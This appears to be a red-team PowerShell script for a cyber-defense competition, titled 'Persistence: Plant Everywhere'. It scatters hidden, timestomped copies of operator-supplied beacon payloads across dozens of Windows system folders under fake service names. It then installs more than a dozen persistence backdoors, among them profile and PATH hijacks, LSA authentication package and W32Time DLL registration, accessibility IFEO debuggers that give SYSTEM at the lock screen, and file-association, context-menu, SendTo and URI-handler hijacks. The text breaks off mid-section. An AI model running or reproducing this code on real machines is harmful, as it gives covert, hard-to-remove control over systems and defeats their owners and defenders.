# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Persistence: Plant Everywhere
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1546.013 (PowerShell Profile)
#               T1037.001 (Logon Script - Windows: UserInitMprLogonScript)
#               T1547.003 (Time Providers)
#               T1547.002 (Authentication Package)
#               T1547.005 (Security Support Provider)
#               T1546.002 (Screensaver)
#               T1574.007 (Path Interception by PATH Environment Variable)
#               T1546.012 (Image File Execution Options Injection - Accessibility)
#               T1546.001 (Change Default File Association)
#               T1547.009 (Shortcut Modification - SendTo)
#               T1546.003 (URI Scheme Handler)
#               T1574.001 (DLL Search Order Hijacking - Sideloading)
#               T1574.010 (Services File Permissions Weakness - AppPaths)
#               T1070.006 (Timestomp)
#
# Targets:      Windows Server 2019, Server 2022, Windows 10/11 (all targets)
# Privilege:    Administrator or SYSTEM required
# Standalone:   YES — do NOT add to CCDC_Windows_P3_COMBINED.ps1
#
# Description:
#   Takes two operator-supplied files (a beacon and a session payload) and
#   scatter-plants renamed, timestomped, hidden copies across 25+ filesystem
#   locations. Then installs 7+ non-interactive boot/logon persistence triggers
#   and 7+ user-interaction-triggered persistence mechanisms — exhausting
#   defenders who find and clean one copy while 20+ others remain.
#
#   NON-INTERACTIVE TRIGGERS (fire without any user action):
#     B1 — PowerShell profile hijack (all 4 profile paths + all user profiles)
#     B2 — UserInitMprLogonScript (separate from P1's Userinit key)
#     B3 — SilentProcessExit + IFEO GlobalFlag on svchost.exe (fires constantly)
#     B4 — W32Time Time Provider DLL (loaded by W32Time service at boot)
#     B5 — Authentication Package (LSA load at boot, requires reboot)
#     B6 — Screensaver hijack (fires after 60s idle on all user sessions)
#     B7 — System PATH prepend (fires on any unqualified cmd/notepad launch)
#
#   INTERACTIVE / USER-TRIGGERED (fires on common user actions):
#     C1 — Accessibility IFEO (Shift×5, Win+U, Win+Enter at lock screen → SYSTEM)
#     C2 — File association hijack (.txt, .log, .cfg, .ini)
#     C3 — AllFileSystemObjects shell verb (Shift+right-click on any file)
#     C4 — SendTo shortcut (right-click → Send To → fake entry)
#     C5 — URI protocol handler (windowsdiag:// scheme)
#     C6 — DLL sideload next to mmc.exe / regedit.exe / taskmgr.exe
#     C7 — App Paths wrapping (notepad, calc, mspaint, write, mmc)
#
#   WHAT IS INTENTIONALLY SKIPPED (already in P1/P2/P3):
#     - WMI subscriptions (P1 ClusterShells, P3 GhostInTheWMI)
#     - COM hijacking (P3 GhostInTheWMI)
#     - Print Monitor DLL (P3 GhostInTheWMI)
#     - Scheduled tasks (P1 ClusterShells/Taskinator, P2)
#     - Registry Run/RunOnce keys (P2, P1)
#     - Services (P1 ClusterShells, P2 WhosThere)
#     - BITS jobs (P2 BackgroundBeef)
#     - AppInit_DLLs (P1 COMBINED)
#     - AppCert DLLs (P1 COMBINED)
#     - LSA Notification Packages (P1 COMBINED)
#     - BITS (P2)
#     - Startup folder (P2)
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator
#Requires -Version 5.1

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$BeaconFile,

    [Parameter(Mandatory = $true)]
    [string]$SessionFile,

    [ValidateRange(1, 200)]
    [int]$Iterations = 20,

    [switch]$SelfClean,
    [switch]$SkipInteractive,
    [switch]$SkipNonInteractive
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Persistence: Plant Everywhere"
Write-Warn "================================================================"
Write-Host ""

# ── 0. Input validation ──────────────────────────────────────────────────────────
if (-not (Test-Path $BeaconFile  -PathType Leaf)) { Write-Err "BeaconFile not found: $BeaconFile";  exit 1 }
if (-not (Test-Path $SessionFile -PathType Leaf)) { Write-Err "SessionFile not found: $SessionFile"; exit 1 }

$BeaconFile  = (Resolve-Path $BeaconFile).Path
$SessionFile = (Resolve-Path $SessionFile).Path

$BeaconExt  = [System.IO.Path]::GetExtension($BeaconFile)
$SessionExt = [System.IO.Path]::GetExtension($SessionFile)

Write-Info "Beacon  : $BeaconFile  ($([Math]::Round((Get-Item $BeaconFile).Length/1KB,1)) KB, ext=$BeaconExt)"
Write-Info "Session : $SessionFile ($([Math]::Round((Get-Item $SessionFile).Length/1KB,1)) KB, ext=$SessionExt)"
Write-Info "Copies  : $Iterations"
Write-Info "SelfClean  : $($SelfClean.IsPresent)"
Write-Host ""

# ── 1. Reference timestamp (grab from ntdll.dll — always a 2019-era date) ────────
$script:RefTime = $null
Write-Section "Initializing reference timestamp"
foreach ($candidate in @(
    "$env:SystemRoot\System32\ntdll.dll",
    "$env:SystemRoot\System32\kernel32.dll",
    "$env:SystemRoot\System32\user32.dll"
)) {
    if (Test-Path $candidate) {
        $script:RefTime = (Get-Item $candidate -Force).LastWriteTime
        Write-Success "Reference timestamp: $($script:RefTime) (from $candidate)"
        break
    }
}
if ($null -eq $script:RefTime) {
    $script:RefTime = [datetime]"2019-03-19 03:44:22"
    Write-Warn "Using fallback timestamp: $($script:RefTime)"
}

# ── 2. Helpers ────────────────────────────────────────────────────────────────────
function Invoke-Timestomp {
    param([string]$Path)
    if (-not (Test-Path $Path -PathType Leaf)) { return }
    try {
        [System.IO.File]::SetCreationTime($Path,   $script:RefTime)
        [System.IO.File]::SetLastWriteTime($Path,  $script:RefTime)
        [System.IO.File]::SetLastAccessTime($Path, $script:RefTime)
    } catch { Write-Warn "  Timestomp failed [$Path]: $_" }
}

function Set-StealthAttributes {
    param([string]$Path)
    try {
        $item = Get-Item -LiteralPath $Path -Force -ErrorAction Stop
        $item.Attributes = $item.Attributes -bor
            [System.IO.FileAttributes]::Hidden -bor
            [System.IO.FileAttributes]::System
    } catch { Write-Warn "  StealthAttrib failed [$Path]: $_" }
}

$script:PlantLog = [System.Collections.Generic.List[object]]::new()
function Add-PlantLog {
    param([string]$Path, [string]$Mechanism)
    $script:PlantLog.Add([pscustomobject]@{
        Path      = $Path
        Mechanism = $Mechanism
        Planted   = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
    })
}

function Copy-Stealth {
    param([string]$Source, [string]$Destination)
    try {
        $dir = Split-Path $Destination -Parent
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null
        }
        Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
        Set-StealthAttributes -Path $Destination
        Invoke-Timestomp     -Path $Destination
        return $Destination
    } catch {
        Write-Warn "  Copy-Stealth failed [$Destination]: $_"
        return $null
    }
}

# ── 3. Legit-sounding name pool ──────────────────────────────────────────────────
$script:NamePool  = @(
    "svchost_diag","msdtc_ext","wuaserv_cache","cryptsvc_ui",
    "dllhost_svc","lsaiso_ext","werfault_svc","diagtrack_svc",
    "taskhostw_ext","rpcss_ext","spoolsv_mon","wbemcore_ext",
    "vds_ext","wmisvc_ext","comsvcs_ext","netsvcs_mon",
    "sedsvc_ext","cfgmgr_ext","ntlmssp_ext","kerberos_ext",
    "winlogon_ext","lsass_mon","audiodg_ext","dwm_ext",
    "ctfmon_ext","sihost_ext","fontdrvhost_ext","wininit_ext",
    "csrss_mon","smss_ext"
)
$script:NameIdx = 0

function Get-NextName {
    param([string]$Ext)
    $n = $script:NamePool[$script:NameIdx % $script:NamePool.Count]
    $script:NameIdx++
    $rand = Get-Random -Minimum 100 -Maximum 999
    return "${n}${rand}${Ext}"
}

# ── 4. Drop location list ────────────────────────────────────────────────────────
Write-Section "Building drop location list"

$drops = [System.Collections.Generic.List[string]]::new()

# Static system locations (Phase 2 used: spool\drivers\color, System32\wbem, INF, Temp)
@(
    "$env:SystemRoot\System32\spool\prtprocs\x64",
    "$env:SystemRoot\System32\spool\PRINTERS",
    "$env:SystemRoot\System32\catroot2",
    "$env:SystemRoot\System32\drivers\etc",
    "$env:SystemRoot\System32\Tasks\Microsoft\Windows\Maintenance",
    "$env:SystemRoot\System32\Tasks\Microsoft\Windows\DiskDiagnostic",
    "$env:SystemRoot\System32\Tasks\Microsoft\Windows\Diagnosis",
    "$env:SystemRoot\System32\Tasks\Microsoft\Windows\WindowsUpdate",
    "$env:SystemRoot\System32\winevt\Logs",
    "$env:SystemRoot\System32\oobe",
    "$env:SystemRoot\System32\config\systemprofile\AppData\Roaming",
    "$env:SystemRoot\SysWOW64\Tasks",
    "$env:SystemRoot\SysWOW64\catroot2",
    "$env:SystemRoot\Fonts",
    "$env:SystemRoot\Help",
    "$env:SystemRoot\inf",
    "$env:SystemRoot\Logs\CBS",
    "$env:SystemRoot\Logs\DISM",
    "$env:SystemRoot\tracing",
    "$env:SystemRoot\Registration",
    "$env:SystemRoot\assembly\NativeImages_v4.0.30319_64\Temp",
    "$env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files",
    "$env:ProgramData\Microsoft\Windows\WER\ReportArchive",
    "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache",
    "$env:ProgramData\Microsoft\Search\Data\Applications\Windows",
    "$env:ProgramData\Microsoft\Windows Defender\Platform",
    "$env:ProgramData\USOShared\Logs",
    "$env:ProgramData\Microsoft\Windows NT\MSFax",
    "C:\PerfLogs",
    "C:\Users\Public\Libraries",
    "C:\Users\Public\AccountPictures"
) | ForEach-Object { $drops.Add($_) }

# Dynamic: per-user AppData paths
Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") } |
    ForEach-Object {
        $u = $_.FullName
        $drops.Add("$u\AppData\Roaming\Microsoft\Windows\Themes")
        $drops.Add("$u\AppData\Roaming\Microsoft\Windows\Libraries")
        $drops.Add("$u\AppData\Local\Microsoft\Windows\INetCache")
        $drops.Add("$u\AppData\Local\Temp")
        $drops.Add("$u\AppData\Roaming\Microsoft\Windows\Recent")
    }

Write-Success "Total drop locations: $($drops.Count)"

# ── 5. Mass file planting ─────────────────────────────────────────────────────────
Write-Section "A — Mass File Planting ($Iterations copies each)"

$planted = 0
for ($i = 0; $i -lt $Iterations; $i++) {
    $loc   = $drops[$i % $drops.Count]
    $bName = Get-NextName -Ext $BeaconExt
    $sName = Get-NextName -Ext $SessionExt

    $bDest = Copy-Stealth -Source $BeaconFile  -Destination (Join-Path $loc $bName)
    $sDest = Copy-Stealth -Source $SessionFile -Destination (Join-Path $loc $sName)

    if ($bDest) { Add-PlantLog -Path $bDest -Mechanism "MassPlant:Beacon";  $planted++ }
    if ($sDest) { Add-PlantLog -Path $sDest -Mechanism "MassPlant:Session"; $planted++ }
}

Write-Success "Mass plant: $planted files written"
$script:PrimaryBeacon  = ($script:PlantLog | Where-Object { $_.Mechanism -eq "MassPlant:Beacon"  } | Select-Object -First 1).Path
$script:PrimarySession = ($script:PlantLog | Where-Object { $_.Mechanism -eq "MassPlant:Session" } | Select-Object -First 1).Path

# Fallback: if every plant failed, use original input paths so triggers still get written
if (-not $script:PrimaryBeacon)  {
    Write-Warn "No beacon plants succeeded — falling back to original input path for triggers"
    $script:PrimaryBeacon = $BeaconFile
}
if (-not $script:PrimarySession) {
    Write-Warn "No session plants succeeded — falling back to original input path for triggers"
    $script:PrimarySession = $SessionFile
}
Write-Info "Primary beacon  : $script:PrimaryBeacon"
Write-Info "Primary session : $script:PrimarySession"

# Build launch command strings that work regardless of beacon file type.
# cmd.exe cannot ShellExecute a .ps1 directly — it yields "Access is denied."
if ($BeaconExt -eq ".ps1") {
    $script:BeaconCmdLaunch = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`""
    $script:BeaconPSLaunch  = "Start-Process powershell.exe -ArgumentList '-NonInteractive','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',`"'$($script:PrimaryBeacon)'`" -ErrorAction SilentlyContinue"
} else {
    $script:BeaconCmdLaunch = "`"$script:PrimaryBeacon`""
    $script:BeaconPSLaunch  = "Start-Process -FilePath '$script:PrimaryBeacon' -WindowStyle Hidden -ErrorAction SilentlyContinue"
}

# ── 6. Non-interactive persistence ───────────────────────────────────────────────
if (-not $SkipNonInteractive) {

    # ─── B1: PowerShell Profile Hijack (T1546.013) ───────────────────────────────
    Write-Section "B1 — PowerShell Profile Hijack (T1546.013)"
    try {
        $appendLine = "`n# Windows PowerShell Compatibility Module`nif(Test-Path '$script:PrimaryBeacon' -PathType Leaf){$script:BeaconPSLaunch}"

        $profilePaths = [System.Collections.Generic.List[string]]::new()
        @(
            $PROFILE.AllUsersAllHosts,
            $PROFILE.AllUsersCurrentHost
        ) | ForEach-Object { if ($_ -and $_ -ne "") { $profilePaths.Add($_) } }

        # All user CurrentUserAllHosts profiles
        Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") } |
            ForEach-Object {
                $profilePaths.Add("$($_.FullName)\Documents\WindowsPowerShell\profile.ps1")
                $profilePaths.Add("$($_.FullName)\Documents\PowerShell\profile.ps1") # PS7
            }

        # Also PS7 all-users profile
        if (Test-Path "C:\Program Files\PowerShell\7") {
            $profilePaths.Add("C:\Program Files\PowerShell\7\profile.ps1")
        }

        $b1ok = 0
        foreach ($pf in $profilePaths) {
            try {
                $pfDir = Split-Path $pf -Parent
                if (-not (Test-Path $pfDir)) {
                    New-Item -ItemType Directory -Path $pfDir -Force -ErrorAction Stop | Out-Null
                }
                Add-Content -Path $pf -Value $appendLine -Encoding UTF8 -Force -ErrorAction Stop
                Invoke-Timestomp -Path $pf
                Add-PlantLog -Path $pf -Mechanism "B1:PSProfile"
                $b1ok++
            } catch { Write-Warn "  Profile [$pf]: $_" }
        }
        Write-Success "B1 PSProfile: modified $b1ok profile files"
    } catch { Write-Warn "B1 PSProfile failed: $_" }

    # ─── B2: UserInitMprLogonScript (T1037.001) ──────────────────────────────────
    Write-Section "B2 — UserInitMprLogonScript (T1037.001)"
    try {
        $logonBat = "$env:SystemRoot\System32\wbem\mprnotify.bat"
        $batContent = "@echo off`r`nstart /B /MIN powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`""
        [System.IO.File]::WriteAllText($logonBat, $batContent, [System.Text.Encoding]::ASCII)
        Set-StealthAttributes -Path $logonBat
        Invoke-Timestomp      -Path $logonBat
        Add-PlantLog -Path $logonBat -Mechanism "B2:MprLogonScript:file"

        $winlogonKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        Set-ItemProperty -Path $winlogonKey -Name "UserInitMprLogonScript" -Value $logonBat -Type String -Force
        Add-PlantLog -Path "$winlogonKey\UserInitMprLogonScript" -Mechanism "B2:MprLogonScript:reg"
        Write-Success "B2 MprLogonScript: $logonBat"
    } catch { Write-Warn "B2 MprLogonScript failed: $_" }

    # ─── B3: SilentProcessExit on svchost.exe ────────────────────────────────────
    Write-Section "B3 — SilentProcessExit / IFEO GlobalFlag (T1546.012 variant)"
    try {
        $targetProc = "svchost.exe"
        $ifeoKey    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetProc"
        $speKey     = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$targetProc"

        if (-not (Test-Path $ifeoKey)) { New-Item -Path $ifeoKey -Force | Out-Null }
        Set-ItemProperty -Path $ifeoKey -Name "GlobalFlag"   -Value 0x200 -Type DWord -Force

        if (-not (Test-Path $speKey))  { New-Item -Path $speKey  -Force | Out-Null }
        Set-ItemProperty -Path $speKey -Name "MonitorProcess" -Value $script:PrimaryBeacon -Type String -Force
        Set-ItemProperty -Path $speKey -Name "ReportingMode"  -Value 0 -Type DWord -Force

        Add-PlantLog -Path $speKey -Mechanism "B3:SilentProcessExit"
        Write-Success "B3 SilentProcessExit: svchost.exe exits → $script:PrimaryBeacon"
        Write-Info    "  Note: svchost.exe sub-instances exit frequently — this fires every few minutes"
    } catch { Write-Warn "B3 SilentProcessExit failed: $_" }

    # ─── B4: W32Time Time Provider DLL (T1547.003) ───────────────────────────────
    Write-Section "B4 — W32Time Time Provider DLL (T1547.003)"
    try {
        $w32tProvKey = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NTPClientExt"
        if (-not (Test-Path $w32tProvKey)) { New-Item -Path $w32tProvKey -Force | Out-Null }

        # Point to primary session file (ideally a DLL, but we register regardless)
        Set-ItemProperty -Path $w32tProvKey -Name "DllName"      -Value $script:PrimarySession -Type String -Force
        Set-ItemProperty -Path $w32tProvKey -Name "Enabled"      -Value 1                     -Type DWord  -Force
        Set-ItemProperty -Path $w32tProvKey -Name "InputProvider" -Value 0                    -Type DWord  -Force

        Add-PlantLog -Path $w32tProvKey -Mechanism "B4:W32TimeProvider"
        Write-Success "B4 W32Time provider: NTPClientExt → $script:PrimarySession"
        Write-Warn    "  If SessionFile is not a native DLL, W32Time will log an error but survive"
    } catch { Write-Warn "B4 W32Time provider failed: $_" }

    # ─── B5: LSA Authentication Package (T1547.002) ──────────────────────────────
    Write-Section "B5 — LSA Authentication Package (T1547.002)"
    try {
        $lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
        $current = (Get-ItemProperty -Path $lsaKey -Name "Authentication Packages" -ErrorAction Stop)."Authentication Packages"
        # REG_MULTI_SZ can come back as $null or a plain string on some systems; normalise and strip blanks
        if ($current -isnot [array]) { $current = @($current) }
        $current = @($current | Where-Object { $_ })

        # Drop session file as DLL into System32 under a legit-looking name BEFORE touching LSA registry.
        # If the DLL copy fails we skip the registry write entirely — a missing DLL in Authentication
        # Packages causes lsass to crash on the next boot (BSOD / boot loop).
        $authPkgName = "wbemcore_ntlm"
        $authDllDest = "$env:SystemRoot\System32\$authPkgName.dll"
        $authDllResult = Copy-Stealth -Source $SessionFile -Destination $authDllDest

        if (-not $authDllResult) {
            Write-Warn "B5: DLL copy to System32 failed — skipping LSA AuthPackage registration to avoid boot crash"
        } else {
            if ($current -notcontains $authPkgName) {
                $newVal = $current + $authPkgName
                Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value $newVal -Type MultiString -Force
            }
            Add-PlantLog -Path "HKLM\SYSTEM\CurrentControlSet\Control\Lsa - Authentication Packages" -Mechanism "B5:LsaAuthPackage"
            Write-Success "B5 LSA AuthPackage: added '$authPkgName' (requires reboot)"
            Write-Warn    "  DLL must export LsaApInitializePackage or lsass may fail on reboot"
        }
    } catch { Write-Warn "B5 LSA AuthPackage failed: $_" }

    # ─── B6: Screensaver Hijack (T1546.002) ──────────────────────────────────────
    Write-Section "B6 — Screensaver Hijack (T1546.002)"
    try {
        $scrDest = "$env:SystemRoot\System32\diag_saver.scr"
        $scrResult = Copy-Stealth -Source $BeaconFile -Destination $scrDest
        if (-not $scrResult) {
            Write-Warn "B6: .scr copy failed — using original beacon path for screensaver"
            $scrDest = $BeaconFile
        } else {
            Add-PlantLog -Path $scrDest -Mechanism "B6:Screensaver:file"
        }

        # Apply to current user
        $desktopKey = "HKCU:\Control Panel\Desktop"
        Set-ItemProperty $desktopKey -Name "SCRNSAVE.EXE"        -Value $scrDest -Force
        Set-ItemProperty $desktopKey -Name "ScreenSaveActive"    -Value "1"      -Force
        Set-ItemProperty $desktopKey -Name "ScreenSaveTimeOut"   -Value "60"     -Force
        Set-ItemProperty $desktopKey -Name "ScreenSaverIsSecure" -Value "0"      -Force
        Add-PlantLog -Path "$desktopKey\SCRNSAVE.EXE" -Mechanism "B6:Screensaver:HKCU"

        # Apply to all offline user hives
        $ssrOk = 0
        Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") } |
            ForEach-Object {
                $ntuserDat = "$($_.FullName)\NTUSER.DAT"
                if (Test-Path $ntuserDat) {
                    $tmpKey = "HKU\PE_SCRSAV_$($_.Name)"
                    & reg.exe load $tmpKey $ntuserDat 2>&1 | Out-Null
                    try {
                        $hiveKey = "Registry::$tmpKey\Control Panel\Desktop"
                        if (Test-Path $hiveKey) {
                            Set-ItemProperty $hiveKey "SCRNSAVE.EXE"        $scrDest -Force
                            Set-ItemProperty $hiveKey "ScreenSaveActive"    "1"      -Force
                            Set-ItemProperty $hiveKey "ScreenSaveTimeOut"   "60"     -Force
                            Set-ItemProperty $hiveKey "ScreenSaverIsSecure" "0"      -Force
                            $ssrOk++
                        }
                    } finally {
                        & reg.exe unload $tmpKey 2>&1 | Out-Null
                    }
                }
            }
        Write-Success "B6 Screensaver: $scrDest — HKCU + $ssrOk offline hives"
    } catch { Write-Warn "B6 Screensaver failed: $_" }

    # ─── B7: System PATH Prepend / Hijack (T1574.007) ────────────────────────────
    Write-Section "B7 — PATH Environment Variable Hijack (T1574.007)"
    try {
        $hijackDir = "$env:SystemRoot\System32\wbem\bin"
        if (-not (Test-Path $hijackDir)) {
            New-Item -ItemType Directory -Path $hijackDir -Force | Out-Null
        }

        # Drop interceptors for common unqualified-executable names.
        # .ps1 beacons cannot be renamed to .exe (not a valid PE → Access is denied);
        # instead write .bat stubs (PATHEXT searches .BAT before .EXE only when the
        # hijack dir appears first in PATH, so bare "notepad" resolves to our .bat).
        $b7Targets = [ordered]@{
            "cmd"      = "$env:SystemRoot\System32\cmd.exe"
            "notepad"  = "$env:SystemRoot\System32\notepad.exe"
            "mmc"      = "$env:SystemRoot\System32\mmc.exe"
            "regedit"  = "$env:SystemRoot\System32\regedit.exe"
        }
        foreach ($baseName in $b7Targets.Keys) {
            if ($BeaconExt -eq ".ps1") {
                $fakeDest = Join-Path $hijackDir "$baseName.bat"
                $realExe  = $b7Targets[$baseName]
                $batBody  = "@echo off`r`nstart /B powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`"`r`nstart `"`" `"$realExe`" %*"
                try {
                    [System.IO.File]::WriteAllText($fakeDest, $batBody, [System.Text.Encoding]::ASCII)
                    Set-StealthAttributes -Path $fakeDest
                    Invoke-Timestomp      -Path $fakeDest
                    Add-PlantLog -Path $fakeDest -Mechanism "B7:PathHijack"
                } catch { Write-Warn "  B7 bat [$baseName]: $_" }
            } else {
                $fakeDest = Join-Path $hijackDir "$baseName.exe"
                $r = Copy-Stealth -Source $BeaconFile -Destination $fakeDest
                if ($r) { Add-PlantLog -Path $fakeDest -Mechanism "B7:PathHijack" }
            }
        }

        $pathKey   = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
        $curPath   = (Get-ItemProperty $pathKey -Name "Path").Path
        if ($curPath -notlike "*$hijackDir*") {
            Set-ItemProperty $pathKey -Name "Path" -Value "$hijackDir;$curPath" -Force
            Add-PlantLog -Path $pathKey -Mechanism "B7:PathHijack:reg"
        }
        Write-Success "B7 PATH hijack: prepended $hijackDir"
        Write-Warn    "  Unqualified cmd.exe/notepad.exe/mmc.exe/regedit.exe calls will trigger beacon"
        Write-Warn    "  (Beacon should exec real binary after firing to maintain stealth)"
    } catch { Write-Warn "B7 PATH hijack failed: $_" }

} # end SkipNonInteractive

# ── 7. Interactive / user-triggered persistence ───────────────────────────────────
if (-not $SkipInteractive) {

    # ─── C1: Accessibility IFEO Backdoor (T1546.012) ─────────────────────────────
    Write-Section "C1 — Accessibility IFEO (Lock Screen SYSTEM shell) (T1546.012)"
    try {
        $accessTargets = @("sethc.exe","utilman.exe","osk.exe","magnify.exe","narrator.exe")
        $c1ok = 0
        foreach ($acc in $accessTargets) {
            try {
                $accKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$acc"
                if (-not (Test-Path $accKey)) { New-Item -Path $accKey -Force | Out-Null }
                Set-ItemProperty -Path $accKey -Name "Debugger" `
                    -Value "cmd.exe /c $script:BeaconCmdLaunch" -Type String -Force
                Add-PlantLog -Path "$accKey\Debugger" -Mechanism "C1:AccessibilityIFEO:$acc"
                $c1ok++
            } catch { Write-Warn "  IFEO [$acc]: $_" }
        }
        Write-Success "C1 Accessibility IFEO: $c1ok targets set"
        Write-Info    "  Shift×5=sethc, Win+U=utilman, Win+Enter=narrator — all fire beacon as SYSTEM at lockscreen"
    } catch { Write-Warn "C1 Accessibility IFEO failed: $_" }

    # ─── C2: File Association Hijack (T1546.001) ─────────────────────────────────
    Write-Section "C2 — File Association Hijack (T1546.001)"
    try {
        # Wrap HKLM handlers for common text/config extensions
        # Each becomes: launch beacon silently THEN open original app
        $assocMap = @{
            "txtfile"  = @{ Ext = ".txt"; Orig = "$env:SystemRoot\System32\notepad.exe %1"  }
            "logfile"  = @{ Ext = ".log"; Orig = "$env:SystemRoot\System32\notepad.exe %1"  }
            "cfgfile"  = @{ Ext = ".cfg"; Orig = "$env:SystemRoot\System32\notepad.exe %1"  }
            "inifile"  = @{ Ext = ".ini"; Orig = "$env:SystemRoot\System32\notepad.exe %1"  }
        }
        $c2ok = 0
        foreach ($progId in $assocMap.Keys) {
            try {
                $cmdKey = "HKLM:\SOFTWARE\Classes\$progId\shell\open\command"
                $existing = $null
                if (Test-Path $cmdKey) {
                    try { $existing = (Get-ItemProperty $cmdKey -Name "(Default)" -ErrorAction Stop)."(Default)" } catch {}
                }
                if (-not $existing) { $existing = $assocMap[$progId].Orig }

                # Only wrap once — check if already wrapped
                if ($existing -notlike "*$script:PrimaryBeacon*") {
                    $wrapped = "cmd.exe /c $script:BeaconCmdLaunch & $existing"
                    if (-not (Test-Path $cmdKey)) { New-Item -Path $cmdKey -Force | Out-Null }
                    Set-ItemProperty -Path $cmdKey -Name "(Default)" -Value $wrapped -Force
                    Add-PlantLog -Path $cmdKey -Mechanism "C2:FileAssoc:$progId"
                    $c2ok++
                }
            } catch { Write-Warn "  FileAssoc [$progId]: $_" }
        }
        Write-Success "C2 File assoc: $c2ok handlers wrapped (.txt/.log/.cfg/.ini)"
    } catch { Write-Warn "C2 File association failed: $_" }

    # ─── C3: AllFileSystemObjects Shell Verb (Shift+right-click) ─────────────────
    Write-Section "C3 — Context Menu Shell Verb (AllFileSystemObjects)"
    try {
        $verbRoot = "HKLM:\SOFTWARE\Classes\AllFileSystemObjects\shell\WindowsDiagnosticsExt"
        $verbCmd  = "$verbRoot\command"

        if (-not (Test-Path $verbCmd)) { New-Item -Path $verbCmd -Force | Out-Null }
        Set-ItemProperty -Path $verbRoot -Name "(Default)" -Value "Windows Diagnostic Extension" -Force
        Set-ItemProperty -Path $verbRoot -Name "MUIVerb"   -Value "Windows Diagnostic Extension" -Force
        # "Extended" means only visible when Shift is held during right-click — reduces visibility
        Set-ItemProperty -Path $verbRoot -Name "Extended"  -Value "" -Force
        Set-ItemProperty -Path $verbCmd  -Name "(Default)" `
            -Value "cmd.exe /c $script:BeaconCmdLaunch" -Force

        Add-PlantLog -Path $verbRoot -Mechanism "C3:ContextMenu"
        Write-Success "C3 Context menu: WindowsDiagnosticsExt (Shift+right-click any file → beacon)"
    } catch { Write-Warn "C3 Context menu failed: $_" }

    # ─── C4: SendTo Shortcut (T1547.009) ─────────────────────────────────────────
    Write-Section "C4 — SendTo Shortcuts"
    try {
        $wsh  = New-Object -ComObject WScript.Shell -ErrorAction Stop
        $c4ok = 0
        Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") } |
            ForEach-Object {
                $sendToDir = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\SendTo"
                if (Test-Path $sendToDir) {
                    try {
                        $lnkPath = "$sendToDir\Windows Diagnostic Tool.lnk"
                        $lnk = $wsh.CreateShortcut($lnkPath)
                        $lnk.TargetPath       = "powershell.exe"
                        $lnk.Arguments        = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`""
                        $lnk.WorkingDirectory = $env:SystemRoot
                        $lnk.Description      = "Windows Diagnostic Tool"
                        $lnk.IconLocation     = "$env:SystemRoot\System32\shell32.dll,277"
                        $lnk.Save()
                        Set-StealthAttributes -Path $lnkPath
                        Invoke-Timestomp      -Path $lnkPath
                        Add-PlantLog -Path $lnkPath -Mechanism "C4:SendTo"
                        $c4ok++
                    } catch { Write-Warn "  SendTo [$($_.Name)]: $_" }
                }
            }
        Write-Success "C4 SendTo: $c4ok user shortcuts planted"
    } catch { Write-Warn "C4 SendTo failed: $_" }

    # ─── C5: URI Protocol Handler (T1546.003 variant) ────────────────────────────
    Write-Section "C5 — URI Protocol Handler (windowsdiag://)"
    try {
        $protoKey = "HKLM:\SOFTWARE\Classes\windowsdiag"
        $protoCmd = "$protoKey\shell\open\command"

        if (-not (Test-Path $protoCmd)) { New-Item -Path $protoCmd -Force | Out-Null }
        Set-ItemProperty -Path $protoKey -Name "(Default)"    -Value "URL:Windows Diagnostic Protocol" -Force
        Set-ItemProperty -Path $protoKey -Name "URL Protocol" -Value ""                                -Force
        Set-ItemProperty -Path $protoCmd -Name "(Default)" `
            -Value "`"powershell.exe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:PrimaryBeacon`" `"%1`"" -Force

